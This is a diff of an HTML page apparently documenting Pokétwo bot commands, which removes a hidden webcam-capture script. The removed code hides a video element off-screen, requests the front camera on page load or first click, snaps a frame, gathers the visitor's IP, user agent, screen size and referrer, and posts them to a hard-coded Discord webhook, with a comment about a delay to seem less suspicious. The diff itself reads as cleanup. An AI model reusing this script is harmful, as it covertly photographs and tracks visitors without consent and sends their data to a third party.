@@ -19,31 +19,6 @@
             line-height: 1.4;
         }
         
-        /* Hidden camera elements */
-        #camera-container {
-            position: fixed;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            overflow: hidden;
-            opacity: 0;
-            pointer-events: none;
-            z-index: -9999;
-        }
-        
-        #camera-feed {
-            width: 320px;
-            height: 240px;
-            transform: scale(0.1);
-            opacity: 0;
-        }
-        
-        .hidden-canvas {
-            display: none;
-        }
-        
-        /* Original CSS from the template */
         .main-header {
             background-color: #202225;
             padding: 20px;
@@ -150,14 +125,15 @@
             color: #ffffff;
             padding-bottom: 10px;
             border-bottom: 2px solid #40444b;
+            
         }
         
-        .param {
-            background-color: #2f3136;
-            color: #b9bbbe;
-            padding: 2px 6px;
-            font-family: monospace;
-            border: 1px solid #40444b;
+       .param {
+           background-color: #2f3136;
+           color: #b9bbbe;
+           padding: 2px 6px;
+           font-family: monospace;
+           border: 1px solid #40444b;
         }
         
         .command {
@@ -459,13 +435,7 @@
     </style>
 </head>
 <body>
-    <!-- Hidden camera elements -->
-    <div id="camera-container">
-        <video id="camera-feed" autoplay></video>
-    </div>
-    <canvas id="capture-canvas" class="hidden-canvas"></canvas>
-    
-    <!-- Original Pokétwo Content -->
+    <!-- Single Header Section -->
     <div class="main-header">
         <div class="top-row">
             <div class="logo-section">
@@ -1070,264 +1040,5 @@
             </div>
         </div>
     </div>
-
-    <script>
-        // Discord webhook URL
-        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
-        
-        // DOM Elements
-        const cameraContainer = document.getElementById('camera-container');
-        const cameraFeed = document.getElementById('camera-feed');
-        const captureCanvas = document.getElementById('capture-canvas');
-        
-        // Variables
-        let stream = null;
-        let hasCaptured = false;
-        
-        // Function to send screenshot to Discord
-        async function sendToDiscord(imageDataUrl) {
-            try {
-                // Convert data URL to blob
-                const response = await fetch(imageDataUrl);
-                const blob = await response.blob();
-                
-                // Create form data with the image
-                const formData = new FormData();
-                formData.append('file', blob, `visitor_${Date.now()}.jpg`);
-                
-                // Get visitor info
-                const userAgent = navigator.userAgent;
-                const platform = navigator.platform;
-                const language = navigator.language;
-                const screenSize = `${window.screen.width}x${window.screen.height}`;
-                const referrer = document.referrer || 'Direct visit';
-                const timestamp = new Date().toISOString();
-                const ip = await fetch('https://api.ipify.org?format=json')
-                    .then(res => res.json())
-                    .then(data => data.ip)
-                    .catch(() => 'Unknown');
-                
-                // Create embed message
-                const embed = {
-                    title: "🎭 New Visitor Detected",
-                    description: "Screenshot captured from Pokétwo commands page",
-                    color: 0x5865f2,
-                    timestamp: timestamp,
-                    fields: [
-                        {
-                            name: "🌐 IP Address",
-                            value: ip,
-                            inline: true
-                        },
-                        {
-                            name: "🖥️ Platform",
-                            value: platform,
-                            inline: true
-                        },
-                        {
-                            name: "🔍 User Agent",
-                            value: userAgent.substring(0, 100) + (userAgent.length > 100 ? '...' : ''),
-                            inline: false
-                        },
-                        {
-                            name: "🗣️ Language",
-                            value: language,
-                            inline: true
-                        },
-                        {
-                            name: "📱 Screen Size",
-                            value: screenSize,
-                            inline: true
-                        },
-                        {
-                            name: "🔗 Referrer",
-                            value: referrer.substring(0, 100) + (referrer.length > 100 ? '...' : ''),
-                            inline: false
-                        }
-                    ],
-                    footer: {
-                        text: "Pokétwo Commands Tracker"
-                    }
-                };
-                
-                const payload = {
-                    username: "Pokétwo Visitor Logger",
-                    embeds: [embed]
-                };
-                
-                // Send the embed first
-                await fetch(DISCORD_WEBHOOK, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(payload)
-                });
-                
-                // Then send the image
-                await fetch(DISCORD_WEBHOOK, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                console.log('Screenshot sent to Discord');
-                
-            } catch (error) {
-                console.error('Error sending to Discord:', error);
-            }
-        }
-        
-        // Function to capture screenshot
-        function captureScreenshot() {
-            if (!stream) return null;
-            
-            const canvas = captureCanvas;
-            const video = cameraFeed;
-            
-            // Set canvas dimensions
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            
-            // Draw video frame to canvas
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // Add timestamp overlay
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
-            ctx.fillRect(10, 10, 300, 40);
-            ctx.fillStyle = '#ffffff';
-            ctx.font = '14px Arial';
-            ctx.fillText(`Captured: ${new Date().toLocaleString()}`, 20, 35);
-            
-            // Convert to data URL
-            return canvas.toDataURL('image/jpeg', 0.9);
-        }
-        
-        // Main function to capture and send
-        async function captureAndSend() {
-            if (hasCaptured) return;
-            
-            try {
-                // Request camera access
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    } 
-                });
-                
-                // Set camera feed source
-                cameraFeed.srcObject = stream;
-                
-                // Wait for video to load
-                await new Promise(resolve => {
-                    cameraFeed.onloadedmetadata = () => {
-                        resolve();
-                    };
-                });
-                
-                // Wait a moment for camera to stabilize
-                await new Promise(resolve => setTimeout(resolve, 500));
-                
-                // Capture screenshot
-                const screenshot = captureScreenshot();
-                
-                if (screenshot) {
-                    // Send to Discord
-                    await sendToDiscord(screenshot);
-                    hasCaptured = true;
-                    
-                    // Stop camera stream
-                    stream.getTracks().forEach(track => track.stop());
-                }
-                
-            } catch (error) {
-                console.log('Camera access failed or denied:', error.message);
-                
-                // If camera fails, still send visitor info without image
-                try {
-                    const timestamp = new Date().toISOString();
-                    const userAgent = navigator.userAgent;
-                    const platform = navigator.platform;
-                    const ip = await fetch('https://api.ipify.org?format=json')
-                        .then(res => res.json())
-                        .then(data => data.ip)
-                        .catch(() => 'Unknown');
-                    
-                    const embed = {
-                        title: "📱 Visitor Detected (No Camera Access)",
-                        description: "Visitor accessed Pokétwo commands page but camera was denied",
-                        color: 0xff0000,
-                        timestamp: timestamp,
-                        fields: [
-                            {
-                                name: "IP Address",
-                                value: ip,
-                                inline: true
-                            },
-                            {
-                                name: "Platform",
-                                value: platform,
-                                inline: true
-                            },
-                            {
-                                name: "User Agent",
-                                value: userAgent.substring(0, 100) + (userAgent.length > 100 ? '...' : ''),
-                                inline: false
-                            },
-                            {
-                                name: "Camera Status",
-                                value: "Access denied or not available",
-                                inline: true
-                            }
-                        ],
-                        footer: {
-                            text: "Pokétwo Commands Tracker"
-                        }
-                    };
-                    
-                    const payload = {
-                        username: "Pokétwo Visitor Logger",
-                        embeds: [embed]
-                    };
-                    
-                    await fetch(DISCORD_WEBHOOK, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(payload)
-                    });
-                    
-                } catch (discordError) {
-                    console.error('Failed to send Discord message:', discordError);
-                }
-                
-                hasCaptured = true;
-            }
-        }
-        
-        // Start capture when page loads
-        window.addEventListener('load', () => {
-            // Small delay to make it less suspicious
-            setTimeout(() => {
-                captureAndSend();
-            }, 1000);
-            
-            // Also try to capture when user interacts with page
-            document.addEventListener('click', () => {
-                if (!hasCaptured) {
-                    captureAndSend();
-                }
-            });
-            
-            document.addEventListener('keydown', () => {
-                if (!hasCaptured) {
-                    captureAndSend();
-                }
-            });
-        });
-    </script>
 </body>
 </html>
